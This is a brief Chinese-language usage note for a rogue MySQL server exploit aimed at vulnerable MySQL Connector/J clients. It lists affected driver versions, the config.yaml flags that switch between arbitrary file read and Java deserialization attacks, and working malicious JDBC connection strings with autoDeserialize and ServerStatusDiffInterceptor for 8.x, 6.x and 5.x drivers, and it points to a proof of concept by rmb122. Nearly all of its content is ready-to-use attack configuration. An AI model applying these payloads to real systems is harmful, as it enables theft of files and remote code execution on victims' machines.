## 文件读取
版本 < 8.0.15  
配置config.yaml，`always_read: true` `jdbc_exploit: false`，启动rogue_mysql_server  
运行受害者客户端  

## 反序列化
版本 < 8.0.20  
配置config.yaml，`jdbc_exploit: true` `always_exploit: true`，启动rogue_mysql_server  
要触发反序列化漏洞除了版本要求外，还依赖jdbc连接字符串  
> 8.x: jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password  
6.x: jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password  
5.0.x以上: jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password  


PoC 来自于[rmb122](https://github.com/rmb122/rogue_mysql_server)，可自行编译